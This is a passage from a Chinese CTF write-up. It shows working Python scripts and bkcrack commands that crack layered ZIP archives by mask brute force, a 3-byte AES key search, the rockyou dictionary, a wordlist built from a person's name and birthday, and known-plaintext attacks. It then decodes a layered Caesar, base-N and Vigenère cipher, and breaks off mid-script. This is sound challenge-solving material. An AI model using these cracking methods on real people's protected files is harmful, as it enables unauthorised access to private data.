19.txt b'D3+4'
20.txt b')%10'
21.txt b';D1+'
22.txt b'D3=1'
23.txt b'1;D0'
24.txt b'=(D3'
25.txt b'*D7+'
26.txt b'6)%1'
27.txt b'0;D1'
28.txt b'6=(D'
29.txt b'0*D1'
30.txt b'+4)%'
31.txt b'10;D'
32.txt b'17=D'
33.txt b'15+D'
34.txt b'7+2;'
35.txt b'D19='
36.txt b'(D16'
37.txt b'+D0+'
38.txt b'4)%1'
39.txt b'0;D6'
40.txt b'=(D1'
41.txt b'*D7+'
42.txt b'8)%1'
43.txt b'0;D1'
44.txt b'3=(D'
45.txt b'3+D0'
46.txt b'+4)%'
47.txt b'10;D'
48.txt b'2=(D'
49.txt b'19+D'
50.txt b'17+1'
51.txt b')%10'
52.txt b';D4='
53.txt b'(D7*'
54.txt b'D17+'
55.txt b'4)%1'
56.txt b'0;D1'
57.txt b'8+D1'
58.txt b'=5;D'
59.txt b'12+D'
60.txt b'18=9'
61.txt b';---'

==== 拼接结果 ====
PASSWORD=?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d;D3=6;D15+D3=6;D7=(D15+D3+4)%10;D1+D3=11;D0=(D3*D7+6)%10;D16=(D0*D1+4)%10;D17=D15+D7+2;D19=(D16+D0+4)%10;D6=(D1*D7+8)%10;D13=(D3+D0+4)%10;D2=(D19+D17+1)%10;D4=(D7*D17+4)%10;D18+D1=5;D12+D18=9;---
```

将所有明文拼接得到谜题：

```txt
b'PASSWORD=?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d;D3=6;D15+D3=6;D7=(D15+D3+4)%10;D1+D3=11;D0=(D3*D7+6)%10;D16=(D0*D1+4)%10;D17=D15+D7+2;D19=(D16+D0+4)%10;D6=(D1*D7+8)%10;D13=(D3+D0+4)%10;D2=(D19+D17+1)%10;D4=(D7*D17+4)%10;D18+D1=5;D12+D18=9;---'
```

整理一下：

```txt
PASSWORD=?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d;
D3=6;
D15+D3=6;
D7=(D15+D3+4)%10;
D1+D3=11;
D0=(D3*D7+6)%10;
D16=(D0*D1+4)%10;
D17=D15+D7+2;
D19=(D16+D0+4)%10;
D6=(D1*D7+8)%10;
D13=(D3+D0+4)%10;
D2=(D19+D17+1)%10;
D4=(D7*D17+4)%10;
D18+D1=5;
D12+D18=9;
---
```

这似乎是一个方程。

我们也许可以通过解方程得到密码。

#### Track 4 约束爆破

```bash
known: {0: 6, 1: 5, 2: 7, 3: 6, 4: 4, 6: 8, 7: 0, 12: 9, 13: 6, 15: 0, 16: 4, 17: 2, 18: 0, 19: 4}
mask: 65764?80????96?04204
unknown positions: [5, 8, 9, 10, 11, 14]
===
flags=0x0001 comp=99 crc=00000000 csize=8017238 usize=8017210 name=b'mask_plus(three_bytes).zip'
first bytes of payload: 019907000200414503000000f4fc5dad
central: vmade=788 vneed=20 flags=0x0001 comp=99 crc=00000000 csize=8017238 usize=8017210
end of cd at 8017305 file size 8017410

AES hdr: 019907000200414503000000f4fc5dad
```

掩码爆破，PBKDF2+2 字节校验值筛选。

脚本如下：

```py
import hashlib, hmac, struct
from multiprocessing import Pool

TEMPLATE = '65764?80????96?04204'
UNKNOWN = [5, 8, 9, 10, 11, 14]

data = open('mask.zip', 'rb').read()
nlen = struct.unpack('<H', data[26:28])[0]
elen = struct.unpack('<H', data[28:30])[0]
payload = data[30 + nlen + elen:]
SALT = payload[:16]          # AES-256 -> 16-byte salt
PV = payload[16:18]          # 2-byte password verification value
CD = payload[18:]            # ciphertext + auth code
AUTH_TAIL = payload[-16:]    # the auth code sits at the very end

def check(n):
    digits = list(TEMPLATE)
    for pos in UNKNOWN:
        digits[pos] = str(n % 10)
        n //= 10
    pwd = ''.join(digits).encode()
    dk = hashlib.pbkdf2_hmac('sha1', pwd, SALT, 1000, 66)
    if dk[64:66] != PV:
        return None
    mac = hmac.new(dk[32:64], PV + CD, 'sha1').digest()
    if mac[:4] in AUTH_TAIL:
        return pwd.decode()
    return 'PV-ONLY:' + pwd.decode()

if __name__ == '__main__':
    total = 10 ** len(UNKNOWN)
    found = []
    with Pool(8) as pool:
        for i, res in enumerate(pool.imap_unordered(check, range(total), chunksize=2000)):
            if res:
                found.append(res)
                print('CANDIDATE:', res, flush=True)
            if i % 200000 == 0:
                print(f'... {i}/{total}', flush=True)
    print('done. candidates:', found)
```

```bash
... 0/1000000
CANDIDATE: PV-ONLY:65764480850396104204
... 200000/1000000
CANDIDATE: PV-ONLY:65764180597396204204
CANDIDATE: PV-ONLY:65764380324996204204
CANDIDATE: PV-ONLY:65764180245096304204
CANDIDATE: PV-ONLY:65764080144796304204
... 400000/1000000
CANDIDATE: PV-ONLY:65764380029896404204
CANDIDATE: PV-ONLY:65764580259096504204
CANDIDATE: PV-ONLY:65764980292496504204
... 600000/1000000
CANDIDATE: PV-ONLY:65764880392096604204
CANDIDATE: PV-ONLY:65764480164396604204
CANDIDATE: PV-ONLY:65764880876496704204
CANDIDATE: PV-ONLY:65764680088696704204
... 800000/1000000
CANDIDATE: PV-ONLY:65764180739296804204
done. candidates: ['PV-ONLY:65764480850396104204', 'PV-ONLY:65764180597396204204', 'PV-ONLY:65764380324996204204', 'PV-ONLY:65764180245096304204', 'PV-ONLY:65764080144796304204', 'PV-ONLY:65764380029896404204', 'PV-ONLY:65764580259096504204', 'PV-ONLY:65764980292496504204', 'PV-ONLY:65764880392096604204', 'PV-ONLY:65764480164396604204', 'PV-ONLY:65764880876496704204', 'PV-ONLY:65764680088696704204', 'PV-ONLY:65764180739296804204']
```

pyzipper 精确验证 13 个候选：

```bash
no : 65764480850396104204
no : 65764180597396204204
no : 65764380324996204204
no : 65764180245096304204
no : 65764080144796304204
no : 65764380029896404204
no : 65764580259096504204
no : 65764980292496504204
no : 65764880392096604204
no : 65764480164396604204
no : 65764880876496704204
HIT: 65764680088696704204 b'PK\x03\x04\x14\x00\x01\x00'
no : 65764180739296804204
```

`65764680088696704204` 命中密码。

当然这里应该使用 hashcat 也可以，留一个思路。

这里得到下一个文件 `mask_plus(three_bytes).zip`

#### Track 5 AES 短密钥爆破

这里的名字中的暗示让我迷惑的一段时间，我一开始以为是 `mask_?b?b?b`。

但是仔细一想我觉得 `?b?b?b` 更合理一点，事实证明确实如此。

这里我们需要快速爆破 AES 的三字节密钥：

```py
import hashlib, struct, os
from multiprocessing import Pool

data = open('mask_plus(three_bytes).zip', 'rb').read()
nlen = struct.unpack('<H', data[26:28])[0]
elen = struct.unpack('<H', data[28:30])[0]
payload = data[30 + nlen + elen:]
SALT = payload[:16]
PV = payload[16:18]

def check(t):
    pwd = t.to_bytes(3, 'big')
    dk = hashlib.pbkdf2_hmac('sha1', pwd, SALT, 1000, 66)
    if dk[64:66] == PV:
        return pwd
    return None

if __name__ == '__main__':
    total = 256 ** 3
    hits = []
    with Pool(os.cpu_count()) as pool:
        for i, res in enumerate(pool.imap_unordered(check, range(total), chunksize=8192)):
            if res:
                hits.append(res)
                print('PV-HIT:', res.hex(), flush=True)
            if i % 2000000 == 0:
                print(f'... {i}/{total}', flush=True)
    print('DONE_HEX:', [h.hex() for h in hits], flush=True)
```

```txt
> python crack_3byte.py
... 0/16777216
PV-HIT: 01ca8d
PV-HIT: 02edc3
PV-HIT: 09a7d2
PV-HIT: 08f1eb
PV-HIT: 0c8f30
PV-HIT: 0cc939
PV-HIT: 0df5e1
PV-HIT: 0da42a
PV-HIT: 0d49d0
PV-HIT: 1120c3
PV-HIT: 119838
PV-HIT: 126a16
PV-HIT: 136dda
PV-HIT: 14243d
PV-HIT: 1635e4
PV-HIT: 157d97
PV-HIT: 1836ba
PV-HIT: 18a7b2
PV-HIT: 195e48
PV-HIT: 1d3e12
PV-HIT: 1e4b5a
... 2000000/16777216
PV-HIT: 1f3b16
PV-HIT: 206648
PV-HIT: 241f25
PV-HIT: 2474bf
PV-HIT: 261a3f
PV-HIT: 2683fe
PV-HIT: 2696df
PV-HIT: 27068d
PV-HIT: 27e5a9
PV-HIT: 284285
PV-HIT: 28ed8f
PV-HIT: 2a86bc
PV-HIT: 2b3783
PV-HIT: 2d08fd
PV-HIT: 2d4bb1
PV-HIT: 2d7928
PV-HIT: 2f2853
PV-HIT: 2f04f5
PV-HIT: 2f7149
PV-HIT: 325354
PV-HIT: 32fe51
PV-HIT: 341c39
PV-HIT: 35825b
PV-HIT: 373f85
PV-HIT: 39b882
PV-HIT: 3b4d4c
PV-HIT: 3bd394
PV-HIT: 3ae15e
PV-HIT: 3af1b6
... 4000000/16777216
PV-HIT: 3d0e38
PV-HIT: 40b4a1
PV-HIT: 42f176
PV-HIT: 43cf84
PV-HIT: 443408
PV-HIT: 455d27
PV-HIT: 453c41
PV-HIT: 464244
PV-HIT: 464355
PV-HIT: 45a6ac
PV-HIT: 4696e5
PV-HIT: 46cfd0
PV-HIT: 472003
PV-HIT: 4731ea
PV-HIT: 48a9bb
PV-HIT: 49e64f
PV-HIT: 4abca8
PV-HIT: 4b3ded
PV-HIT: 4cf0c6
PV-HIT: 5037e5
PV-HIT: 506864
PV-HIT: 514517
PV-HIT: 5368e7
PV-HIT: 54b737
PV-HIT: 56688c
PV-HIT: 563e85
PV-HIT: 57ad88
PV-HIT: 580d8d
PV-HIT: 585493
PV-HIT: 59191f
PV-HIT: 59d05b
... 6000000/16777216
PV-HIT: 5bd7a0
PV-HIT: 5d3ce6
PV-HIT: 5dda0b
PV-HIT: 5ff467
PV-HIT: 6094a0
PV-HIT: 610c27
PV-HIT: 617a19
PV-HIT: 631424
PV-HIT: 635839
PV-HIT: 63f5f8
PV-HIT: 6445db
PV-HIT: 654e05
PV-HIT: 65514e
PV-HIT: 658dfb
PV-HIT: 6714de
PV-HIT: 66864e
PV-HIT: 68a6a8
PV-HIT: 6875c8
PV-HIT: 695111
PV-HIT: 6a873b
PV-HIT: 6a4b3b
PV-HIT: 6bde9f
PV-HIT: 6b92fc
PV-HIT: 6b93a4
PV-HIT: 6cb8d0
PV-HIT: 6cd3de
PV-HIT: 6e8620
PV-HIT: 6fa5cf
PV-HIT: 6fbbfc
PV-HIT: 734af1
PV-HIT: 74882d
PV-HIT: 75d50d
PV-HIT: 76489e
PV-HIT: 769f6f
PV-HIT: 77644f
PV-HIT: 787730
PV-HIT: 79280b
PV-HIT: 7a345b
... 8000000/16777216
PV-HIT: 7f04f1
PV-HIT: 7f77cb
PV-HIT: 7e30d9
PV-HIT: 81a16f
PV-HIT: 824e18
PV-HIT: 81f454
PV-HIT: 82f51e
PV-HIT: 84213b
PV-HIT: 847df5
PV-HIT: 85c0d7
PV-HIT: 85cbd8
PV-HIT: 867125
PV-HIT: 883e50
PV-HIT: 89688b
PV-HIT: 8abaea
PV-HIT: 89c467
PV-HIT: 8cd443
PV-HIT: 9009aa
PV-HIT: 91093f
PV-HIT: 910df3
PV-HIT: 91153d
PV-HIT: 9311a5
PV-HIT: 927175
PV-HIT: 94e522
PV-HIT: 95804b
PV-HIT: 953351
PV-HIT: 969575
PV-HIT: 9746f2
PV-HIT: 989e30
... 10000000/16777216
PV-HIT: 99d5e6
PV-HIT: 996c90
PV-HIT: 9b68fc
PV-HIT: 9b438e
PV-HIT: 9cb2be
PV-HIT: 9cbe28
PV-HIT: 9cbf0d
PV-HIT: 9d1802
PV-HIT: 9db8b5
PV-HIT: a0c4d0
PV-HIT: a1d531
PV-HIT: a2a39a
PV-HIT: a86fc4
PV-HIT: a89481
PV-HIT: a99059
PV-HIT: aa8048
PV-HIT: a9ff4c
PV-HIT: ab6b6b
PV-HIT: aca300
PV-HIT: aca42d
PV-HIT: acead3
PV-HIT: ad1459
PV-HIT: ad7256
PV-HIT: adcca3
PV-HIT: add5c6
PV-HIT: b004ae
PV-HIT: b03b3b
PV-HIT: b0fff8
PV-HIT: b1ea29
PV-HIT: b39a1b
PV-HIT: b4dbe6
PV-HIT: b52d6e
PV-HIT: b6b810
PV-HIT: b60822
... 12000000/16777216
PV-HIT: b7ca36
PV-HIT: b913c0
PV-HIT: bb0df1
PV-HIT: bb87b8
PV-HIT: bcb020
PV-HIT: bddc4e
PV-HIT: bdedc5
PV-HIT: bf67a6
PV-HIT: bf7927
PV-HIT: bfce88
PV-HIT: c05740
PV-HIT: bf2494
PV-HIT: c1175b
PV-HIT: c262a5
PV-HIT: c21c8e
PV-HIT: c1a4ef
PV-HIT: c38437
PV-HIT: c373eb
PV-HIT: c48988
PV-HIT: c5a947
PV-HIT: c7758a
PV-HIT: c793e6
PV-HIT: c929ff
PV-HIT: c936f1
PV-HIT: c9b1bb
PV-HIT: ca5e89
PV-HIT: cc2786
PV-HIT: cd4386
PV-HIT: cd21ea
PV-HIT: ce07b8
PV-HIT: cea6f3
PV-HIT: cf6110
... 14000000/16777216
PV-HIT: d72c73
PV-HIT: d6afbb
PV-HIT: d7b13b
PV-HIT: da0f0c
PV-HIT: da9fab
PV-HIT: dc1290
PV-HIT: dc5c5e
PV-HIT: ddcbd8
PV-HIT: de71cc
PV-HIT: defd6c
PV-HIT: e14176
PV-HIT: e1305f
PV-HIT: e2c77e
PV-HIT: e49f7f
PV-HIT: e6b9e0
PV-HIT: eac8e5
PV-HIT: eb1117
PV-HIT: eae9e6
PV-HIT: ebbf98
PV-HIT: ecf2c8
PV-HIT: edcffe
PV-HIT: edee4a
PV-HIT: edf4ce
PV-HIT: f01ff7
PV-HIT: efe953
PV-HIT: f16cd3
... 16000000/16777216
PV-HIT: f4a7a9
PV-HIT: f70301
PV-HIT: f8134c
PV-HIT: f8ec71
PV-HIT: fc991a
PV-HIT: ff4507
PV-HIT: ffb357
PV-HIT: ff6009
PV-HIT: fffb7d
DONE_HEX: ['01ca8d', '02edc3', '09a7d2', '08f1eb', '0c8f30', '0cc939', '0df5e1', '0da42a', '0d49d0', '1120c3', '119838', '126a16', '136dda', '14243d', '1635e4', '157d97', '1836ba', '18a7b2', '195e48', '1d3e12', '1e4b5a', '1f3b16', '206648', '241f25', '2474bf', '261a3f', '2683fe', '2696df', '27068d', '27e5a9', '284285', '28ed8f', '2a86bc', '2b3783', '2d08fd', '2d4bb1', '2d7928', '2f2853', '2f04f5', '2f7149', '325354', '32fe51', '341c39', '35825b', '373f85', '39b882', '3b4d4c', '3bd394', '3ae15e', '3af1b6', '3d0e38', '40b4a1', '42f176', '43cf84', '443408', '455d27', '453c41', '464244', '464355', '45a6ac', '4696e5', '46cfd0', '472003', '4731ea', '48a9bb', '49e64f', '4abca8', '4b3ded', '4cf0c6', '5037e5', '506864', '514517', '5368e7', '54b737', '56688c', '563e85', '57ad88', '580d8d', '585493', '59191f', '59d05b', '5bd7a0', '5d3ce6', '5dda0b', '5ff467', '6094a0', '610c27', '617a19', '631424', '635839', '63f5f8', '6445db', '654e05', '65514e', '658dfb', '6714de', '66864e', '68a6a8', '6875c8', '695111', '6a873b', '6a4b3b', '6bde9f', '6b92fc', '6b93a4', '6cb8d0', '6cd3de', '6e8620', '6fa5cf', '6fbbfc', '734af1', '74882d', '75d50d', '76489e', '769f6f', '77644f', '787730', '79280b', '7a345b', '7f04f1', '7f77cb', '7e30d9', '81a16f', '824e18', '81f454', '82f51e', '84213b', '847df5', '85c0d7', '85cbd8', '867125', '883e50', '89688b', '8abaea', '89c467', '8cd443', '9009aa', '91093f', '910df3', '91153d', '9311a5', '927175', '94e522', '95804b', '953351', '969575', '9746f2', '989e30', '99d5e6', '996c90', '9b68fc', '9b438e', '9cb2be', '9cbe28', '9cbf0d', '9d1802', '9db8b5', 'a0c4d0', 'a1d531', 'a2a39a', 'a86fc4', 'a89481', 'a99059', 'aa8048', 'a9ff4c', 'ab6b6b', 'aca300', 'aca42d', 'acead3', 'ad1459', 'ad7256', 'adcca3', 'add5c6', 'b004ae', 'b03b3b', 'b0fff8', 'b1ea29', 'b39a1b', 'b4dbe6', 'b52d6e', 'b6b810', 'b60822', 'b7ca36', 'b913c0', 'bb0df1', 'bb87b8', 'bcb020', 'bddc4e', 'bdedc5', 'bf67a6', 'bf7927', 'bfce88', 'c05740', 'bf2494', 'c1175b', 'c262a5', 'c21c8e', 'c1a4ef', 'c38437', 'c373eb', 'c48988', 'c5a947', 'c7758a', 'c793e6', 'c929ff', 'c936f1', 'c9b1bb', 'ca5e89', 'cc2786', 'cd4386', 'cd21ea', 'ce07b8', 'cea6f3', 'cf6110', 'd72c73', 'd6afbb', 'd7b13b', 'da0f0c', 'da9fab', 'dc1290', 'dc5c5e', 'ddcbd8', 'de71cc', 'defd6c', 'e14176', 'e1305f', 'e2c77e', 'e49f7f', 'e6b9e0', 'eac8e5', 'eb1117', 'eae9e6', 'ebbf98', 'ecf2c8', 'edcffe', 'edee4a', 'edf4ce', 'f01ff7', 'efe953', 'f16cd3', 'f4a7a9', 'f70301', 'f8134c', 'f8ec71', 'fc991a', 'ff4507', 'ffb357', 'ff6009', 'fffb7d']
```

拿到候选的密钥后简单测试即可：

```txt
total candidates: 249
*** REAL HIT: bdedc5 b'PK\x03\x04\x14\x00\x01\x00'
verification done
```

得到正确的密钥 0xbdedc5。

解压得到下一个文件 `rockme.zip`。

#### Track 6 弱密码 rockyou.txt

这个名字很自然地可以联想到 `rockyou.txt` 这个著名的字典。

我们尝试爆破一下：

![](https://img.halfcity.top/2026/11/11/096b2265377cb20d8eff0c09eb7ade35.avif)

很快得到密码 `chronic`。

得到下一个文件 `social.zip`。

#### Track 7 社工字典

`profile.txt` 文件中的内容如下：

```txt
====================================
NOTE: All information below is randomly generated.
信息均为随机生成，如有雷同纯属巧合。
====================================

Name: Brandon Thomas
Date of Birth: 1987-11-04
```

结合压缩包的名字猜测可能这里需要我们结合个人信息自己生成一个字典。

也就是我们常说的社工攻击了。

把 profile 的信息丢给 ai 让他帮忙生成一个字典：

```py
# -*- coding: utf-8 -*-
"""
用法：
  python crack_social.py                          # 生成字典 + PBKDF2/校验值快筛 + pyzipper 精确验证
  python crack_social.py --dump social_dict.txt   # 仅导出字典文件
"""
import hashlib, struct, sys, os
from multiprocessing import Pool

ZPATH = 'target.zip'

# ---------- 1. 社工字典生成 ----------
def name_variants():
    """姓名素材：全名/单名/缩写的各种写法"""
    base = ['Brandon', 'Thomas', 'BrandonThomas', 'ThomasBrandon',
            'Brandon Thomas', 'BT', 'TB', 'BrandonT', 'TBrandon', 'BThomas', 'ThomasB']
    out = set()
    for s in base:
        out.add(s)
        out.add(s.lower())
        out.add(s.upper())
        if ' ' in s:
            out.add(s.replace(' ', ''))            # 去空格
        out.add(s.replace(' ', '_'))
        out.add(s.replace(' ', '.'))
        out.add(s.replace(' ', '-'))
    return sorted(out)

def dob_variants():
    """生日素材：1987-11-04 的各种格式（含美式 mm/dd 与中式 dd/mm 两种顺序）"""
    y, m, d = '1987', '11', '04'
    return sorted({
        y, y[2:], m, d, m + d, d + m, y + m, m + y[2:], m + y,
        y + m + d, d + m + y[2:], m + d + y[2:], d + m + y,
        y + '-' + m + '-' + d, y[2:] + m + d, m + '/' + d + '/' + y, d + '/' + m + '/' + y,
        m + '.' + d + '.' + y, y + '/' + m + '/' + d, m + '-' + d, d + '-' + m,
        m + '.' + d, d + '.' + m, y + m + d + m + d, m + d + y,
    })

def leet(s):
    """轻量 leet 变体：a->4 o->0 s->5 e->3 i->1"""
    table = str.maketrans({'a': '4', 'o': '0', 's': '5', 'e': '3', 'i': '1'})
    return s.translate(table)

SUFFIXES = ['', '!', '!!', '123', '1234', '12345', '666', '888', '000', '111',
            '@', '#', '?', '.', '1987', '87', '~!', '@123', '_123']

def gen_dict():
    names, dobs = name_variants(), dob_variants()
    cands = set()
    # 单独的姓名/生日 + 常见后缀
    for n in names:
        for suf in SUFFIXES:
            cands.add(n + suf)
        l = leet(n)
        if l != n:
            cands.add(l)
            for suf in ('', '!', '123', '1987', '1104'):
                cands.add(l + suf)
    for dt in dobs:
        cands.add(dt)
        cands.add(dt + '!')
    # 姓名 x 生日 组合（两种顺序，多种分隔符）
    seps = ['', '_', '.', '-', '@', ' ']
    for n in names:
        for dt in dobs:
            for sep in seps:
                cands.add(n + sep + dt)
                cands.add(dt + sep + n)
    # 姓名 x 生日 x 后缀（常用分隔符）
    for n in names:
        for dt in dobs:
            for sep in ('', '_', '.', '-'):
                for suf in ('', '!', '!!', '123', '@'):
                    cands.add(n + sep + dt + suf)
    cands.discard('')
    return sorted(cands)

# ---------- 2. AES 快筛（PBKDF2 + 2 字节校验值） ----------
data = open(ZPATH, 'rb').read()
_nlen = struct.unpack('<H', data[26:28])[0]
_elen = struct.unpack('<H', data[28:30])[0]
_payload = data[30 + _nlen + _elen:]
SALT = _payload[:16]
PV = _payload[16:18]

def check(pwd_bytes):
    dk = hashlib.pbkdf2_hmac('sha1', pwd_bytes, SALT, 1000, 66)
    if dk[64:66] == PV:
        return pwd_bytes
    return None

def verify(pwd_bytes):
    """过筛候选的精确验证（完整解密 + HMAC）"""
    import pyzipper
    try:
        with pyzipper.AESZipFile(ZPATH) as z:
            z.setpassword(pwd_bytes)
            return z.read(z.namelist()[0])[:8]
    except Exception:
        return None

if __name__ == '__main__':
    d = gen_dict()
    print(f'字典规模: {len(d)}', flush=True)
    if '--dump' in sys.argv:
        out = sys.argv[sys.argv.index('--dump') + 1]
        with open(out, 'wb') as f:
            f.write(b'\n'.join(p.encode() for p in d) + b'\n')
        print(f'已导出 -> {out}')
        sys.exit(0)
    hits = []
    with Pool(os.cpu_count()) as pool:
        for i, res in enumerate(pool.imap_unordered(check, [p.encode() for p in d], chunksize=500)):
            if res:
                print('PV-HIT:', res, flush=True)
                hits.append(res)
    print(f'过筛命中 {len(hits)} 个，进入精确验证...', flush=True)
    for h in hits:
        head = verify(h)
        if head:
            print(f'*** 真实密码: {h!r}  文件头: {head}')
```

好吧 ai 好像多写了点东西，把爆破也写进去了。

不过我们只需要这里生成字典的部分即可。

最后也是很快就爆破出密码了：

![](https://img.halfcity.top/2026/11/11/f06296ee4ace163e33dd711c9c5bc73b.avif)

密码是 `brandon_1104`。

解压得到下一个文件 `DoYouKnowZip.zip`。

#### Track 8 已知明文攻击 - 单图片

注意到压缩包使用 ZipCrypto 算法加密同时提供了一个压缩包内的文件 nailong.png。

我们将他压缩随后就可以使用 bkcrack进行已知明文攻击了。

```bash
❯ bkcrack -C DoYouKnowZip.zip --cipher-index 0 -P nailong.zip --plain-index 0
bkcrack 1.8.1 - 2025-10-25
[09:44:22] Z reduction using 1048569 bytes of known plaintext
3.3 % (34815 / 1048569)
[09:44:23] Attack on 214 Z values at index 1014615
Keys: ea598753 88ae54fe fc2916b2
9.8 % (21 / 214)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 21
[09:44:23] Keys
ea598753 88ae54fe fc2916b2

❯ bkcrack -C DoYouKnowZip.zip -k ea598753 88ae54fe fc2916b2 -D unlocked.zip
bkcrack 1.8.1 - 2025-10-25
[09:45:37] Writing decrypted archive unlocked.zip
100.0 % (3 / 3)
```

密钥如下 `ea598753 88ae54fe fc2916b2`。

得到解密重命名后的压缩包 `unlocked.zip`。

#### Track 9 已知明文攻击 - 单压缩包

这题直接给了压缩包，还是和上面一样直接进行已知明文攻击。

```bash
❯ bkcrack -C DoYouReallyKnowZip.zip --cipher-index 0 -P meme_ref.zip --plain-index 0
bkcrack 1.8.1 - 2025-10-25
[09:48:07] Z reduction using 95488 bytes of known plaintext
7.2 % (6895 / 95488)
[09:48:08] Attack on 211 Z values at index 89442
Keys: 6306b96a 1efb7f19 9a786c60
90.0 % (190 / 211)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 190
[09:48:08] Keys
6306b96a 1efb7f19 9a786c60

❯ bkcrack -C DoYouReallyKnowZip.zip -k 6306b96a 1efb7f19 9a786c60 -D unlocked_2.zip
bkcrack 1.8.1 - 2025-10-25
[09:49:49] Writing decrypted archive unlocked_2.zip
100.0 % (2 / 2)
```

密钥如下：`6306b96a 1efb7f19 9a786c60`。

得到解密重命名后的压缩包 `unlocked_2.zip`。

#### Track 10 已知明文攻击 - OLE 文件头

搜索 OLE 的文件特征发现有一个几乎固定的头部 D0CF11E0A1B11AE10000000000000000。

我们尝试直接进行已知明文攻击：

```bash
❯ bkcrack -C AreYouSureYouKnowZip.zip -c ole.doc -x 0 D0CF11E0A1B11AE10000000000000000
bkcrack 1.8.1 - 2025-10-25
[10:46:12] Z reduction using 9 bytes of known plaintext
100.0 % (9 / 9)
[10:46:12] Attack on 723659 Z values at index 6
Keys: a1a368c1 d72f8a9f eabfb3b7
64.3 % (465453 / 723659)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 465453
[11:02:39] Keys
a1a368c1 d72f8a9f eabfb3b7
```

速度有点慢，而且能不能爆破出来还有点没底，所以这一步尝试需要一点勇气。

密钥如下：`a1a368c1 d72f8a9f eabfb3b7`。

得到解密重命名后的压缩包 `unlocked_3.zip`。

#### Track 11 已知明文攻击 - PNG IEND 文件尾

有了上一步的前车之鉴我们这一步就很容易猜得出来是要靠 png 的固定字节来爆破了。

尝试使用 png 头部爆破发现没有结果，不知道是不是魔改了。

这里检查一下图片的大小尝试利用 png 的尾部爆破：

```bash
> bkcrack -C \unlocked_3\DoYouReallyReallyKnowZip.zip -c flag.png -x 110400 0000000049454E44AE426082
bkcrack 1.8.1 - 2025-10-25
[23:40:10] Z reduction using 4 bytes of known plaintext
100.0 % (4 / 4)
[23:40:10] Attack on 1442750 Z values at index 110407
Keys: f42cc00d 95db89f2 6c1f9d73
3.5 % (49782 / 1442750)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 49782
[23:40:32] Keys
f42cc00d 95db89f2 6c1f9d73
```

密钥如下：`f42cc00d 95db89f2 6c1f9d73`。

最后的解压得到 `flag.png`

![](https://img.halfcity.top/2026/11/11/da6f990d4a01d140285d42a9f1cd834c.avif)

```txt
flag{fb2fdc56-9154-97d2-1778-bbd0dad2d325}
```

## Crypto

### Layered Crypt

分析给出的加密文件。

encrypt1(m, key)：Vigenère（仅处理字母，key 循环移位）。

multi_encode2(text1, iterations)：随机 1~100 次交替 b16encode / b32encode / b64encode。

encrypt3(text, shift)：递进 Caesar（每字符 cur 自增 1，仅移位字母）。

密文特征：

- 仅含 0-9A-Z（无小写、+/=）。
- 最后一层必为 b16（只有它能产生 0-9A-F，递进移位后变成完整 0-9A-Z）。
- shift % 26 可通过“解移位后字母必须落在 A-F”唯一确定。

解密脚本如下：

```py
import base64
from collections import Counter
import string

def recover_text2(cipher: str) -> str:
    """反推 encrypt3，恢复 text2（纯大写十六进制）"""
    # 枚举 shift % 26，要求所有字母解移位后落在 A-F
    possible_s = []
    for s in range(26):
        ok = True
        for i, ch in enumerate(cipher):
            if ch.isalpha():
                val = (ord(ch) - ord('A') - s - i) % 26
                if val > 5:          # 必须是 A-F
                    ok = False
                    break
        if ok:
            possible_s.append(s)
    assert len(possible_s) == 1, f"期望唯一 s，得到 {possible_s}"
    s = possible_s[0]
    print(f"[+] shift % 26 = {s}")

    text2 = []
    for i, ch in enumerate(cipher):
        if ch.isalpha():
            val = (ord(ch) - ord('A') - s - i) % 26
            text2.append(chr(val + ord('A')))
        else:
            text2.append(ch)
    text2 = ''.join(text2)
    assert all(c in '0123456789ABCDEF' for c in text2)
    return text2


def peel_encodings(text2: str) -> str:
    data = text2.encode('ascii')
    layers = []

    for _ in range(120):
        candidates = []
        # b16
        try:
            if len(data) % 2 == 0:
                dec = base64.b16decode(data, casefold=True)
                candidates.append(('b16', dec))
        except Exception:
            pass
        # b32
        try:
            pad = (8 - len(data) % 8) % 8
            dec = base64.b32decode(data + b'=' * pad)
            candidates.append(('b32', dec))
        except Exception:
            pass
        # b64
        try:
            pad = (4 - len(data) % 4) % 4
            dec = base64.b64decode(data + b'=' * pad)
            candidates.append(('b64', dec))
        except Exception:
            pass

        if not candidates:
            break

        # 优先选择结果为可打印 ASCII 的解码
        best = None
        for name, dec in candidates:
            try:
                as_str = dec.decode('ascii')
                if all(32 <= ord(c) < 127 for c in as_str):
                    best = (name, dec, as_str)
                    break
            except Exception:
                continue

        if best is None:
            break

        name, dec, as_str = best
        layers.append(name)
        data = dec

        # 已经很短且不再像编码字符串 → 停止
        if len(data) < 400 and not all(
            c in string.ascii_letters + string.digits + '+/=' for c in as_str
        ):
            break

    print(f"[+] 剥离层数: {len(layers)}")
    print(f"[+] 层顺序(从外到内): {layers}")
    return data.decode('ascii')


def break_vigenere(text1: str) -> tuple[str, str]:
    """经典频率分析破 Vigenère，返回 (key, plaintext)"""
    # 提取纯大写字母
    cipher_letters = ''.join(c.upper() for c in text1 if c.isalpha())

    # 英文频率
    eng_freq = {
        'A': 0.08167, 'B': 0.01492, 'C': 0.02782, 'D': 0.04253, 'E': 0.12702,
        'F': 0.02228, 'G': 0.02015, 'H': 0.06094, 'I': 0.06966, 'J': 0.00153,
        'K': 0.00772, 'L': 0.04025, 'M': 0.02406, 'N': 0.06749, 'O': 0.07507,
        'P': 0.01929, 'Q': 0.00095, 'R': 0.05987, 'S': 0.06327, 'T': 0.09056,
        'U': 0.02758, 'V': 0.00978, 'W': 0.02360, 'X': 0.00150, 'Y': 0.01974, 'Z': 0.00074
    }

    def chi2(s: str) -> float:
        n = len(s)
        if n == 0:
            return 999.0
        freqs = Counter(s)
        return sum((freqs.get(c, 0)/n - eng_freq[c])**2 / eng_freq[c]
                   for c in string.ascii_uppercase)

    # IC 找密钥长度（本例最优为 8）
    def ic(s: str) -> float:
        n = len(s)
        if n < 2:
            return 0.0
        freqs = Counter(s)
        return sum(f*(f-1) for f in freqs.values()) / (n*(n-1))

    best_len, best_ic = 1, 0.0
    for kl in range(1, 21):
        avg = sum(ic(cipher_letters[i::kl]) for i in range(kl)) / kl
        if avg > best_ic:
            best_ic, best_len = avg, kl
